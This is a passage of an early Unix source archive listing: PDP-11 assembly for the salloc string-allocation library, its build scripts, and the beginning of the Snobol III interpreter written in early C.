	cmp	r2,r3
	ble	1f
	jsr	pc,release
	mov	r2,r0
	jsr	pc,allocate
	mov	4(sp),r0
/
1:	mov	a(r1),w(r1)	/rewind w pointer
	mov	a(r0),-(sp)
/
4:	mov	(sp),0f
	mov	afi,r0
	sys	seek;0:.. ;0	/set input pointer
	cmp	r2,$512.
	ble	2f
	mov	$512.,r3	/# output this time
	mov	r3,0f
	mov	r3,3f
	add	r3,(sp)
	sub	r3,r2	/# left to output
	br	1f
/
2:	mov	r2,0f
	mov	r2,3f
	mov	r2,r3
	clr	r2
/
1:	mov	afi,r0
	sys	read;b1;0:..
	bes	bad
	cmp	r0,r3
	bne	bad
	mov	afout,r0
	mov	(r1),0f
	add	r3,(r1)
	sys	seek;0:.. ;0
	sys	write;b1;3:..
	bes	bad
	tst	r2
	bgt	4b
	tst	(sp)+
	mov	4(sp),r0	/restore r0
/
/	fix up read ptr of new string
/
1:	mov	r(r0),r2
	sub	a(r0),r2
	add	a(r1),r2
	mov	r2,r(r1)
/
/	restore and return
/
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,r0
	rts	pc
/
bad:	mov	$1,r0
	sys write;1f;2f-1f
	4
1:	<error on copy\n>
2:	.even
/
/
wc:
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	clr	r3
1:
	cmp	r3,nbuf
	bge	1f
	mov	r3,r2
	asl	r2
	tst	w1(r2)
	ble	2f
	mov	r3,r1
	ashc	$9.,r1
	bic	$777,r1
	add	$b1,r1
	jsr	pc,clean
2:
	inc	r3
	br	1b
1:
	jsr	pc,whead
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,r1
	rts	pc
swap:
	mov	w(r1),-(sp)
	mov	w(r0),w(r1)
	mov	(sp),w(r0)
	mov	r(r1),(sp)

	mov	r(r0),r(r1)
	mov	(sp),r(r0)
	mov	a(r1),(sp)
	mov	a(r0),a(r1)
	mov	(sp),a(r0)
	mov	l(r1),(sp)
	mov	l(r0),l(r1)
	mov	(sp)+,l(r0)
	rts	pc
/
/
/
/
/
/	mov	position,r0
/	mov	...,r1
/	jsr	pc,seekchar
/
seekchar:
	mov	r1,-(sp)
	mov	r0,-(sp)
1:
	mov	(sp),r0
	add	a(r1),r0
	cmp	r0,l(r1)
	bhi	3f
	mov	r0,r(r1)
	cmp	r0,w(r1)
	blo	1f
	mov	r0,w(r1)
	br	1f
3:
	mov	(sp),r0
	jsr	pc,allocate
	mov	2(sp),r0
	jsr	pc,copy
	jsr	pc,swap
	jsr	pc,release
	mov	2(sp),r1
	br	1b
1:
	mov	(sp)+,r0
	mov	(sp)+,r1
	rts	pc
/
reset:
	mov	r3,-(sp)
	mov	r2,-(sp)
	clr	r3
1:
	cmp	r3,nbuf
	bge	1f
	mov	r3,r2
	asl	r2
	mov	$-1.,w1(r2)
	clr	b1s(r2)
	clr	b1e(r2)
	clr	u1(r2)
	inc	r3
	br	1b
1:
	clr	flag
	mov	(sp)+,r2
	mov	(sp)+,r3
	rts	pc
/
-- /usr/source/salloc/alloc2.s mode=0100664 uid=3 gid=3 atime=174924387 mtime=169260932 --
/
/	routine to read from disc to a buffer
/	wcing the buffer if necessary
/	mov	disc addr,r0
/	mov	buffer addr,r2
/	jsr	pc,getb
/	on return r0 = addr of byte in buffer
/
getb:
	mov	r3,-(sp)
	mov	r1,-(sp)
	mov	r0,-(sp)
	mov	r2,r3
	asr	r3
	mov	r3,r1
	ashc	$9.,r1
	bic	$777,r1
	add	$b1,r1
	tst	w1(r2)	/ w
	ble	1f

	jsr	pc,clean

1:	mov	(sp),r0
	bic	$777,r0		/get lowest multiple of 512.
	mov	r0,0f
	mov	r0,b1s(r2)	/set start
	mov	afi,r0
	sys	seek;0:..;0
	mov	r1,0f
	sys	read;0:..;512.

	mov	b1s(r2),b1e(r2)
	add	$512.,b1e(r2)	/ set end
	clr	w1(r2)	/clear w
	mov	(sp)+,r0
	sub	b1s(r2),r0
	add	r1,r0	/ set r0=byte addr in buffer
	mov	(sp)+,r1
	mov	(sp)+,r3
	rts	pc
/
/
/	routine to wc a buffer
/	mov	buffer addr,r2
/	mov	buffer addr+6,r1	beginning of buffer
/	jsr	pc,clean
/
clean:
	mov	r0,-(sp)
	mov	b1s(r2),0f
	mov	afout,r0
	sys	seek;0:..;0
	mov	r1,0f
	sys	write;0:..;512.

	clr	w1(r2)	/clear w
	mov	(sp)+,r0
	rts	pc
/
/	routine to get buffer addr of byte whose disc
/	addr is in r0 - also returns addr of write
/	flag for buffer in r2
/	mov	disc addr,r0
/	jsr	pc,bufchar
/	mov	(r0),r0	for read
/	inc	(r2)	for write must inc w
/	c-bit set if char not in either buffer
/
bufchar:
	mov	r1,-(sp)
	mov	r3,-(sp)
	clr	r3
1:
	mov	r3,r2
	asl	r2
	cmp	r0,b1s(r2)
	blo	2f
	cmp	r0,b1e(r2)
	bhis	2f
	sub	b1s(r2),r0
	mov	r3,r1
	ashc	$9.,r1
	bic	$777,r1
	add	r1,r0
	add	$b1,r0
	mov	(sp)+,r3
	mov	(sp)+,r1
	clc
	rts	pc
2:
	inc	r3
	cmp	r3,nbuf
	blt	1b
	mov	(sp)+,r3
	mov	(sp)+,r1
	sec
	rts	pc
/
/	routine to get a buffer
/	mov	disc addr,r0
/	jsr	pc,getbuf
/	mov	(r0),r0	(for read)
/	inc	(r2)	must inc w for w
/
getbuf:
	mov	r4,-(sp)
	mov	r3,-(sp)
	mov	$2,r3
	clr	r2
	mov	$1,r4
1:
	cmp	r4,nbuf
	bge	1f
	cmp	u1(r3),u1(r2)
	bhis	2f
	mov	r3,r2
2:
	inc	r4
	add	$2.,r3
	br	1b
1:
	mov	r2,r3
	jsr	pc,getb
	add	$stats+6.,r3
	inc	(r3)
	mov	(sp)+,r3
	mov	(sp)+,r4
	rts	pc
/
/	routine to look at next character from string
/	pointed to by r1;  character returned in r0
/	c-bit set if character not available (end of file)
/	r1 is preserved
/
/	mov	...,r1
/	jsr	pc,lookchar
/	movb	r0,...
/
lookchar:
	mov	r2,-(sp)
	jsr	pc,plausible
	cmp	w(r1),r(r1)	/W,R
	blos	noch
	mov	r(r1),r0
	jsr	pc,bufchar
	bec	2f
	jsr	pc,getbuf
/
2:
	inc	flag
	bne	2f
	jsr	pc,fixct
	br	1f
2:
	mov	flag,u1(r2)
1:
	mov	(sp)+,r2
	movb	(r0),r0
	tst	r0	/clears c-bit
	rts	pc
/
noch:
	mov	(sp)+,r2
	clr	r0
	sec
	rts	pc
/
/
/	routine to put a character into the string
/	pointed to by r1;  character in r0
/	r0 is preserved; r1 points to the string
/	after return and must be saved.
/
/	movb	ch,r0
/	mov	...,r1
/	jsr	pc,putchar
/	mov	r1,...
/
putchar:
	mov	r2,-(sp)
	mov	r1,-(sp)
	mov	r0,nchar
	jsr	pc,plausible
1:	cmp	w(r1),l(r1)	/W,L
	blt	3f
	mov	w(r1),r0
	inc	r0
	sub	a(r1),r0	/W-A+1
	jsr	pc,allocate
	mov	(sp),r0
	jsr	pc,copy
	jsr	pc,swap
	jsr	pc,release
	mov	(sp),r1
/
3:	mov	w(r1),r0
	jsr	pc,bufchar
	bec	2f
	jsr	pc,getbuf
2:	movb	nchar,(r0)
	mov	$1,w1(r2)

	mov	nchar,r0	/to preserve r0 for user
	inc	w(r1)
	inc	flag
	bne	2f
	jsr	pc,fixct
	br	1f
2:
	mov	flag,u1(r2)
1:
	mov	(sp)+,r1
	mov	(sp)+,r2
	rts	pc

/
/
fixct:
	mov	r1,-(sp)
	mov	r3,-(sp)
	mov	nbuf,r1
	mov	nbuf,flag
2:
	mov	r1,u1(r2)
	dec	r1
	bge	1f
	mov	(sp)+,r3
	mov	(sp)+,r1
	rts	pc
1:
	clr	r2
	mov	$2,r3
1:
	cmp	r3,nbuf2
	bge	2b
	cmp	u1(r3),u1(r2)
	blo	2f
	mov	r3,r2
2:
	add	$2,r3
	br	1b
-- /usr/source/salloc/alloc3.s mode=0110664 uid=3 gid=3 atime=174924388 mtime=169260932 --
.globl	flag
.globl	b1, w1, u1, b1s, b1e
/	here to allocate a new block
/
/
/	mov	...,r0
/	jsr	pc,allocate
/	mov	r1,...
/
/	requested size in bytes in r0
/	pointer to header of allocated block returned in r1
/	r0 is preserved
/
/	convert to words, adjust for header, round up
/	to a power of two
/
/	each block has a four-word header
/		W - write ptr (also used as link ptr in frlist)
/		R - read ptr
/		A - pointer to head of data
/		L - ptr to (end+1) of data
hsz=1024.
numb=4.
numb2=2*numb
w=0
r=2
a=4
l=6
/
allocate:
	mov	r0,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	tst	stats
	bne	1f
	jsr	pc,initl
1:
	inc	stats
	dec	r0
	bmi	1f
	jsr	pc,log2
	inc	r0
1:	asl	r0
	mov	r0,-(sp)
/
/	look on free list for block of required size
/
zzz:
	mov	(sp),r0
	tst	frlist(r0)
	beq	xxx
/
/	found it, allocate and return
/
	mov	frlist(r0),r1
	add	$hblk,r1
	mov	(r1),frlist(r0)
	mov	a(r1),r0
	mov	r0,w(r1)
	mov	r0,r(r1)
	tst	(sp)+
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,r0
/	jsr	pc,whead
	rts	pc
/
/	no block of required size
/	look for larger block
/
xxx:
	tst	(r0)+
	cmp	r0,$frend-frlist
	bhis	www
	tst	frlist(r0)
	bne	yyy
	br	xxx
/
/	there are no larger blocks;  must garbage collect
/
www:	jsr	pc,collect
	tst	r0
	bne	zzz
/
/	out of space
/
	mov	$1,r0
	sys	write; 1f; 2f-1f
	4
1:	<Out of space.\n>
2:	.even
/
/	split larger block into two smaller pieces and
/	link together as smaller blocks in the free list.
/
yyy:
	mov	hblk,r3	/get free header block
	beq	www
	mov	frlist(r0),r1
	add	$hblk,r1
	mov	w(r1),frlist(r0)
	mov	r3,w(r1)
	add	$hblk,r3
	mov	exp2-2(r0),r2
	add	a(r1),r2
	mov	w(r3),hblk
	mov	l(r1),l(r3)
	mov	r2,l(r1)		/L
	mov	r2,a(r3)
	clr	w(r3)			/W'
	mov	r1,r2
	sub	$hblk,r2
	mov	r2,frlist-2(r0)
	br	zzz
/
/
/	here to release a block
/
/	mov	...,r1
/	jsr	pc,release
/
/	pointer to block in r1
/
release:
/
/	discover that this is a plausible pointer
/
	mov	r0,-(sp)
	jsr	pc,preposterous
/
/	find free list index and link block to that entry
/
	inc	stats+2
	mov	frlist(r0),w(r1)
	clr	r(r1)
	sub	$hblk,r1
	mov	r1,frlist(r0)
	clr	r1		/self-defense
/	jsr	pc,whead
	mov	(sp)+,r0
	rts	pc
/
/
/	jsr	pc,collect
/
/	coalesce free storage by rejoining paired blocks
/	on the free list.
/	zero is returned in r0 if no paired blocks were found.
/
collect:
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	r3,-(sp)
	mov	r4,-(sp)
	clr	useful
	inc	stats+4.
	clr	r0		/start with smallest blocks
				/r0 contains frlist index
loop1:	mov	$frlist,r1
	add	r0,r1
/
/	try next list member at this level
/
loop2:	mov	(r1),r3
	beq	advance		/list is empty
	add	$hblk,r3
	tst	(r3)		/W
	beq	advance		/only one list element
/
/	calculate address of buddy
/
	mov	a(r3),r4
	sub	headsz,r4
	bit	exp2(r0),r4
	beq	2f
	bic	exp2(r0),r4
	br	1f
2:	bis	exp2(r0),r4
1:	add	headsz,r4
/
/	and search for him
/
loop3:
	cmp	a(r3),r4
	beq	coal
	mov	r3,r2
	mov	w(r3),r3
	tst	r3
	beq	nocoal
	add	$hblk,r3
	br	loop3
/
/	have found a pair; remove both blocks from list,
/	coalesce them, and put them on next higher list
/
coal:	inc	useful
	mov	w(r3),w(r2)	/remove him from list
	mov	(r1),r2
	add	$hblk,r2
	mov	r3,r4
	mov	w(r2),w(r1)	/remove other one
	cmp	a(r2),a(r4)
	bgt	1f
	mov	r2,-(sp)
	mov	r4,r2
	mov	(sp)+,r4
1:	mov	hblk,(r2)
	clr	r(r2)
	mov	headsz,a(r2)
	mov	headsz,l(r2)
	sub	$hblk,r2
	mov	r2,hblk
	add	exp2(r0),l(r4)	/L
	clr	r(r4)
	mov	frlist+2(r0),w(r4)
	sub	$hblk,r4
	mov	r4,frlist+2(r0)
	br	loop2
/
/	no buddy found, try next block on this list
/
nocoal:
	mov	(r1),r1
	add	$hblk,r1
	br	loop2
/
/	advance to next free list
/
advance:
	tst	(r0)+
	cmp	r0,$frend-frlist
	blo	loop1
	mov	useful,r0
/
/	restore registers and return
/
	mov	(sp)+,r4
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,r1
	rts	pc
/
/	routine to find integer part of log2(x)
/
/	jsr	pc,log2
/
/	r0 = log2(r0)
/
log2:
	mov	$15.,-(sp)
	tst	r0
	beq	2f
1:
	asl	r0
	bcs	2f
	dec	(sp)
	br	1b
2:
	mov	(sp)+,r0
	rts	pc
/
	0
exp2:
	1;2;4;10;20;40;100;200;400;1000;2000;4000;
	10000;20000;40000;100000
/
/	routine to discover whether r1 points to
/	a plausible header - to avoid ruination.
/
/	r1 is preserved and r0 gets a suitable index for frlist
/
/	jsr	pc,preposterous
/
plausible:
	cmp	r1,$strbuf
	blo	botch
	cmp	r1,$strend
	bhis	botch
	rts	pc
/
/
botch:
	mov	r0,-(sp)
	mov	$1,r0
	sys	write; 1f; 2f-1f
	4
1:	<Error in allocator.\n>
2:	.even
/
/
preposterous:
	cmp	r1,$strbuf
	blo	botch
	cmp	r1,$strend
	bhis	botch
	cmp	a(r1),headsz		/A
	blo	botch
	cmp	l(r1),datadr		/L
	bhi	botch
	mov	l(r1),r0		/L
	sub	a(r1),r0		/A
	mov	r0,-(sp)
	jsr	pc,log2
	asl	r0
	cmp	exp2(r0),(sp)
	bne	botch
	mov	r0,(sp)
	mov	frlist(r0),r0
1:	beq	1f
	add	$hblk,r0
	cmp	r0,r1
	beq	botch
	mov	(r0),r0
	br	1b
1:	mov	(sp)+,r0
	rts pc
/
/
whead:
	mov	r0,-(sp)
	mov	afout,r0
	sys	seek;0;0	/write pointer to 0
	sys	write;hblk;hsz
	mov	(sp)+,r0
	rts	pc
/
datasz:	16384.
headsz: hsz
nbuf: numb
nbuf2: numb2

b1s:	.=.+numb2
b1e:	.=.+ numb2
w1:	.=.+ numb2
u1:	.=.+ numb2
b1 = .
/
initl:
	mov	r0,-(sp)
	mov	r2,-(sp)
	sys	open;asmem; 1	/open for write
	bec	2f
	sys	creat;asmem; 606
	bes	err2
2:
	mov	r0,afout
1:
	sys	open; asmem; 0	/open for read
	bes	err2
	mov	r0,afi
1:
	br	gargs
/
err2:
	mov	$1,r0
	sys	write; 1f; 2f-1f
	4
1:	<cannot open output file\n>
2:
asmem:
	<alloc.d\0>
	.even
/
gargs:
	mov	$headers,r2
	mov	r2,r0
	sub	$hblk,r0
	mov	r0,hblk
1:
	add	$8,r0
	mov	r0,(r2)
	add	$8,r2
	cmp	r2,$strend-8.
	blo	1b
	clr	-8(r2)
/
	mov	headsz,datadr
	add	datasz,datadr
/
	mov	$frlist,r0
1:	clr	(r0)+
	cmp	r0,$frend
	blo	1b

	mov	hblk,r2
	add	$hblk,r2
	mov	(r2),hblk
	clr	w(r2)
	mov	headsz,a(r2)
	mov	datadr,l(r2)
	mov	datasz,r0
	jsr	pc,log2
	asl	r0
	cmp	r0,$frend-frlist
	blo	9f; 4; 9:
	sub	$hblk,r2
	mov	r2,frlist(r0)
/
/	install plausible pointers to make octal dumps look ok
/
	mov	$hblk,r1
1:	mov	(r1),r1
	beq	1f
	add	$hblk,r1
	mov	headsz,a(r1)
	mov	headsz,l(r1)
	br	1b
/
1:	mov	afout,r0
	sys	write;hblk;hsz
	jsr	pc,reset
	mov	(sp)+,r2
	mov	(sp)+,r0
	rts	pc
. = b1 + [512.*numb]
/
.bss

flag:	.=.+2
stats:	.=.+18.
useful:	.=.+2
afi:	.=.+2
afout:	.=.+2
datadr:	.=.+2
hblk: .=.+2	/must remain here - pointer to free header
frlist: .=hblk+34.
frend:
headers:
strbuf:	.=hblk+hsz
strend:
nchar: .=.+2
end:
-- /usr/source/salloc/altch.s mode=0100664 uid=3 gid=3 atime=174924391 mtime=169260932 --
.globl	alterchar
.globl	plausible
.globl	stats
.globl	allocate, release
.globl	copy
.globl	bufchar, getbuf
.globl	swap
.globl	w, r, a, l
.globl	w1, flag, u1, fixct
/
/	routine to rewrite the character pointer to by
/	read pointer.  The read pointer is advanced.
/	the string is extended if necessary.
/	there is no error return.
/
/	movb	ch,r0
/	mov	...,r1
/	jsr	pc,alterchar
/	mov	r1,...
/
alterchar:
	mov	r2,-(sp)
	mov	r1,-(sp)
	mov	r0,nchar
	jsr	pc,plausible
	inc	stats+8.
1:	cmp	r(r1),l(r1)	/W,L
	blt	3f
	mov	l(r1),r0
	inc	r0
	sub	a(r1),r0	/W-A+1
	jsr	pc,allocate
	mov	(sp),r0
	jsr	pc,copy
	jsr	pc,swap
	jsr	pc,release
	mov	(sp),r1
/
3:	mov	r(r1),r0
	jsr	pc,bufchar
	bec	2f
	jsr	pc,getbuf

2:	movb	nchar,(r0)
	mov	nchar,r0	/to preserve r0 for user
	inc	r(r1)
	mov	$1,w1(r2)
	cmp	r(r1),w(r1)
	ble	3f
	mov	r(r1),w(r1)
3:
	inc	flag
	bne	1f
	jsr	pc,fixct
	br	2f
1:
	mov	flag,u1(r2)
2:
	mov	(sp)+,r1
	mov	(sp)+,r2
	rts	pc
/
nchar:	.=.+2
-- /usr/source/salloc/bsp.s mode=0100664 uid=3 gid=3 atime=174924393 mtime=169260932 --
.globl	backspace
.globl	lookchar
.globl	w, r, a, l
/
/	routine to read a string backwards
/	the read pointer is decremented before reading
/
/	mov	...,r1
/	jsr	pc,backspace
/	mov	r0,...
/
backspace:
	cmp	a(r1),r(r1)
	bhis	nochc
	dec	r(r1)
	jsr	pc,lookchar
	rts	pc
nochc:	clr	r0
	sec
	rts	pc
-- /usr/source/salloc/bword.s mode=0100664 uid=3 gid=3 atime=174924395 mtime=169260932 --
.globl	backword
.globl	lookchar
.globl	w, r, a, l
/
/
/	routine to get words backwards from string
/
/	mov	...,r1
/	jsr	pc,backword
/	mov	r0,...
/
backword:
	cmp	a(r1),r(r1)
	bhis	nochw
	dec	r(r1)
	jsr	pc,lookchar
	movb	r0,nchar+1
	cmp	a(r1),r(r1)
	bhis	nochw
	dec	r(r1)
	jsr	pc,lookchar
	movb	r0,nchar
	mov	nchar,r0
	rts	pc
/
nochw:
	clr	r0
	sec
	rts	pc
/
nchar:	.=.+2
-- /usr/source/salloc/getch.s mode=0100664 uid=3 gid=3 atime=174924397 mtime=169260932 --
.globl	getchar
.globl	lookchar
.globl	w, r, a, l
/
/
/	routine to read next character from string
/	pointer to by r1; character returned in r0
/	c-bit set if character not availiable (eof)
/
/	mov	...,r1
/	jsr	pc,getchar
/	movb	r0,...
/
getchar:
	jsr	pc,lookchar
	bes	1f
	inc	r(r1)
	tst	r0
1:	rts	pc
-- /usr/source/salloc/getwd.s mode=0100664 uid=3 gid=3 atime=174924398 mtime=169260932 --
.globl	getword
.globl	putword
.globl lookword
.globl alterword
.globl alterchar
.globl	putchar
.globl	lookchar
.globl	w, r, a, l
/
/	routine to put a word onto the string
/	mov	...,r1
/	mov	...,r0
/	jsr	pc,putword
putword:
	jsr	pc,putchar
	swab	r0
	jsr	pc,putchar
	swab	r0
	rts	pc
/
/
/	routine to look at a word from the string
/	mov	...,r1
/	jsr	pc,lookword
/	mov	r0,...
lookword:
	jsr	pc,lookchar
	bes	1f
	movb	r0,nchar
	inc	r(r1)
	jsr	pc,lookchar
	bes	1f
	movb	r0,nchar+1
	dec	r(r1)
	mov	nchar,r0
1:	rts	pc
/
/
/	routine to get a word from the strng
/
getword:
	jsr	pc,lookword
	bes	1f
	add	$2,r(r1)
1:	rts	pc
/
/
/	routine to alter a word in the string
/
alterword:
	jsr	pc,alterchar
	swab	r0
	jsr	pc,alterchar
	swab	r0 
	rts	pc
nchar:	.=.+2
-- /usr/source/salloc/length.s mode=0100664 uid=3 gid=3 atime=174924400 mtime=169260932 --
.globl	length
.globl	position
.globl	w, r, a, l
/
/
/	routine to return the length of a string
/
/	mov	...,r1
/	jsr	pc,length
/	mov	r0,...
/
length:
	mov	w(r1),r0
	sub	a(r1),r0
	rts	pc
/
/
/	routine to return the read pointer position
/
/	mov	...,r1
/	jsr	pc,position
/	mov	r0,...
/
position:
	mov	r(r1),r0
	sub	a(r1),r0
	rts	pc
-- /usr/source/salloc/rewind.s mode=0100664 uid=3 gid=3 atime=174924402 mtime=169260933 --
.globl	rewind
.globl	create
.globl	fsfile
.globl	w, r, a, l
/
/
/	routine to rewind read pointer of string
/	pointed to by r1
/
/	mov	...,r1
/	jsr	pc,rewind
/
rewind:
	mov	a(r1),r(r1)
	rts	pc
/
/	routine to rewind write pointer of string
/	pointed to by r1
/
/	mov	...,r1
/	jsr	pc,create
/
create:
	mov	a(r1),w(r1)
	mov	a(r1),r(r1)
	rts	pc
/
/
/	routine to copy read pointer of string to end of string
/
/	mov	...,r1
/	jsr	pc,fsfile
/
fsfile:
	mov	w(r1),r(r1)
	rts	pc
-- /usr/source/salloc/run mode=0100664 uid=3 gid=3 atime=174924408 mtime=174917293 --
as alloc?.s; mv a.out alloc.o
as altch.s; mv a.out altch.o
as bsp.s; mv a.out bsp.o
as bword.s; mv a.out bword.o
as getch.s; mv a.out getch.o
as getwd.s; mv a.out getwd.o
as length.s; mv a.out length.o
as rewind.s; mv a.out rewind.o
as zero.s; mv a.out zero.o
ar r /lib/libs.a *.o
rm *.o
-- /usr/source/salloc/zero.s mode=0100664 uid=3 gid=3 atime=174924404 mtime=169260933 --
.globl	zero
.globl	putchar
.globl	w, r, a, l
/
/
/	routine to zero a string
/
/	mov	...,r1
/	jsr	pc,zero
/
zero:
	mov	r0,-(sp)
	mov	a(r1),w(r1)
	clrb	r0
1:	cmp	w(r1),l(r1)
	bhis	1f
	jsr	pc,putchar
	br	1b
1:	mov	a(r1),w(r1)
	mov	(sp)+,r0
	rts	pc
-- /usr/source/sno mode=0140775 uid=3 gid=3 atime=174930097 mtime=174924474 --
-- /usr/source/sno/run mode=0100664 uid=3 gid=3 atime=174924473 mtime=174917296 --
cc -s -O sno?.c
cmp a.out /usr/bin/sno
cp a.out /usr/bin/sno
rm *.o a.out
-- /usr/source/sno/sno.h mode=0100664 uid=3 gid=3 atime=174924454 mtime=169260940 --
struct	node {
	struct node *p1;
	struct node *p2;
	char typ;
	char ch;
};

int	freesize;
struct	node *lookf;
struct	node *looks;
struct	node *lookend;
struct	node *lookstart;
struct	node *lookdef;
struct	node *lookret;
struct	node *lookfret;
int	cfail;
int	rfail;
struct	node *freelist;
struct	node *namelist;
int	lc;
struct	node *schar;
-- /usr/source/sno/sno1.c mode=0110664 uid=3 gid=3 atime=174924412 mtime=169260940 --
#include "sno.h"

/*
 *   Snobol III
 */


int	freesize;
struct node *freespace &end;
struct node *freelist 0;
int	*fault -1;

mes(s) {
	sysput(strstr(s));
}

init(s, t) {
	register struct node *a, *b;

	a = strstr(s);
	b = look(a);
	delete(a);
	b->typ = t;
	return(b);
}

main(argc, argv)
char *argv[];
{
	extern fin, fout;
	register struct node *a, *b, *c;

	if(argc > 1) {
		fin = open(argv[1], 0);
		if(fin < 0) {
			mes("cannot open input");
			exit();
		}
	}
	fout = dup(1);
	lookf = init("f", 0);
	looks = init("s", 0);
	lookend = init("end", 0);
	lookstart = init("start", 0);
	lookdef = init("define", 0);
	lookret = init("return", 0);
	lookfret = init("freturn", 0);
	init("syspit", 3);
	init("syspot", 4);
	a = c = compile();
	while (lookend->typ != 2) {
		a->p1 = b = compile();
		a = b;
	}
	cfail = 1;
	a->p1 = 0;
	if (lookstart->typ == 2)
		c = lookstart->p2;
	while (c=execute(c));
	flush();
}

syspit() {
	extern fin;
	register struct node *b, *c, *d;
	int a;

	if ((a=getchar())=='\n')
		return(0);
	b = c = alloc();
	while(a != '\n') {
		c->p1 = d = alloc();
		c = d;
	l:
		c->ch = a;
		if(a == '\0') {
			if(fin) {
				close(fin);
				fin = 0;
				a = getchar();
				goto l;
			}
			rfail = 1;
			break;
		}
		a = getchar();
	}
	b->p2 = c;
	if(rfail) {
		delete(b);
		b = 0;
	}
	return(b);
}

syspot(string)
struct node *string;
{
	register struct node *a, *b, *s;

	s = string;
	if (s!=0) {
		a = s;
		b = s->p2;
		while(a != b) {
			a = a->p1;
			putchar(a->ch);
		}
	}
	putchar('\n');
}

strstr(s)
char s[];
{
	int c;
	register struct node *e, *f, *d;

	d = f = alloc();
	while ((c = *s++)!='\0') {
		(e=alloc())->ch = c;
		f->p1 = e;
		f = e;
	}
	d->p2 = e;
	return(d);
}

class(c) {
	switch (c) {
		case ')':  return(1);
		case '(':  return(2);
		case '\t':
		case ' ': return(3);
		case '+':  return(4);
		case '-':  return(5);
		case '*': return(6);
		case '/':  return(7);
		case '$':  return(8);
		case '"':
		case '\'': return(9);
		case '=':  return(10);
		case ',':  return(11);
	}
	return(0);
}

alloc() {
	register struct node *f;
	register int i;
	extern fout;

	if (freelist==0) {
		if (--freesize < 20) {
			if ((i=sbrk(1200)) == -1) {
				flush();
				write (fout, "Out of free space\n", 18);
				exit();
			}
			freesize =+ 200;
		}
		return(freespace++);
	}
	f = freelist;
	freelist = freelist->p1;
	return(f);
}

free(pointer)
struct node *pointer;
{
	pointer->p1 = freelist;
	freelist = pointer;
}

nfree()
{
	register int i;
	register struct node *a;

	i = freesize;
	a = freelist;
	while(a) {
		a = a->p1;
		i++;
	}
	return(i);
}

look(string)
struct node *string;
{
	register struct node *i, *j, *k;

	k = 0;
	i = namelist;
	while (i) {
		j = i->p1;
		if (equal(j->p1, string) == 0)
			return(j);
		i = (k=i)->p2;
	}
	i = alloc();
	i->p2 = 0;
	if (k)
		k->p2 = i;
	else
		namelist = i;
	j = alloc();
	i->p1 = j;
	j->p1 = copy(string);
	j->p2 = 0;
	j->typ = 0;
	return(j);
}

copy(string)
struct node *string;
{
	register struct node *j, *l, *m;
	struct node *i, *k;

	if (string == 0)
		return(0);
	i = l = alloc();
	j = string;
	k = string->p2;
	while(j != k) {
		m = alloc();
		m->ch = (j=j->p1)->ch;
		l->p1 = m;
		l = m;
	}
	i->p2 = l;
	return(i);
}

equal(string1, string2)
struct node *string1, *string2;
{
	register struct node *i, *j, *k;
	struct node *l;
	int n, m;

	if (string1==0) {
		if (string2==0)
			return(0);
		return(-1);
	}
	if (string2==0)
		return(1);
	i = string1;
	j = string1->p2;
	k = string2;
	l = string2->p2;
	for(;;) {
		m = (i=i->p1)->ch;
		n = (k=k->p1)->ch;
		if (m>n)
			return(1);
		if (m<n)
			return(-1);
		if (i==j) {
			if (k==l)
				return(0);
			return(-1);
		}
		if (k==l)
			return(1);
	}
}

strbin(string)
struct node *string;
{
	int n, m, sign;
	register struct node *p, *q, *s;

	s = string;
	n = 0;
	if (s==0)
		return(0);
	p = s->p1;
	q = s->p2;
	sign = 1;
	if (class(p->ch)==5) { /* minus */
		sign = -1;
		if (p==q)
			return(0);
		p = p->p1;
	}
loop:
	m = p->ch - '0';
	if (m>9 | m<0)
		writes("bad integer string");
	n = n * 10 + m;
	if (p==q)
		return(n*sign);
	p = p->p1;
	goto loop;
}

binstr(binary) {
	int n, sign;
	register struct node *m, *p, *q;

	n = binary;
	p = alloc();
	q = alloc();
	sign = 1;
	if (binary<0) {
		sign = -1;
		n = -binary;
	}
	p->p2 = q;
loop:
	q->ch = n%10+'0';
	n = n / 10;
	if (n==0) {
		if (sign<0) {
			m = alloc();
			m->p1 = q;
			q = m;
			q->ch = '-';
		}
		p->p1 = q;
		return(p);
	}
	m = alloc();
	m->p1 = q;
	q = m;
	goto loop;
}

add(string1, string2) {
	return(binstr(strbin(string1) + strbin(string2)));
}

sub(string1, string2) {
	return(binstr(strbin(string1) - strbin(string2)));
}

mult(string1, string2) {
	return(binstr(strbin(string1) * strbin(string2)));
}

div(string1, string2) {
	return(binstr(strbin(string1) / strbin(string2)));
}

cat(string1, string2) 
struct node *string1, *string2;
{
	register struct node *a, *b;

	if (string1==0)
		return(copy(string2));
	if (string2==0)
		return(copy(string1));
	a = copy(string1);
	b = copy(string2);
	a->p2->p1 = b->p1;
	a->p2 = b->p2;
	free(b);
	return(a);
}

dcat(a,b)
struct node *a, *b;
{
	register struct node *c;

	c = cat(a,b);
	delete(a);
	delete(b);
	return(c);
}

delete(string)
struct node *string;
{
	register struct node *a, *b, *c;

	if (string==0)
		return;
	a = string;
	b = string->p2;
	while(a != b) {
		c = a->p1;
		free(a);
		a = c;
	}
	free(a);
}

sysput(string) {
	syspot(string);
	delete(string);
}

dump()
{
	dump1(namelist);
}

dump1(base)
struct node *base;
{
	register struct node *b, *c, *e;
	struct node *d;

	while (base) {
		b = base->p1;
		c = binstr(b->typ);
		d = strstr("  ");
		e = dcat(c, d);
		sysput(cat(e, b->p1));
		delete(e);
		if (b->typ==1) {
			c = strstr("   ");
			sysput(cat(c, b->p2));
			delete(c);
		}
		base = base->p2;
	}
}

writes(s) {

	sysput(dcat(binstr(lc),dcat(strstr("\t"),strstr(s))));
	flush();
	if (cfail) {
		dump();
		flush();
		exit();
	}
	while(getc());
	while (compile());
	flush();
	exit();
}

getc() {
	register struct node *a;
	static struct node *line;
	static linflg;

	while (line==0) {
		line = syspit();
		if(rfail) {
			cfail++;
			writes("eof on input");
		}
		lc++;
	}
	if (linflg) {
		line = 0;
		linflg = 0;
		return(0);
	}
	a = line->p1;
	if (a==line->p2) {
		free(line);
		linflg++;
	} else
		line->p1 = a->p1;
	return(a);
}
-- /usr/source/sno/sno2.c mode=0110664 uid=3 gid=3 atime=174924427 mtime=169260941 --
#include "sno.h"


compon() {
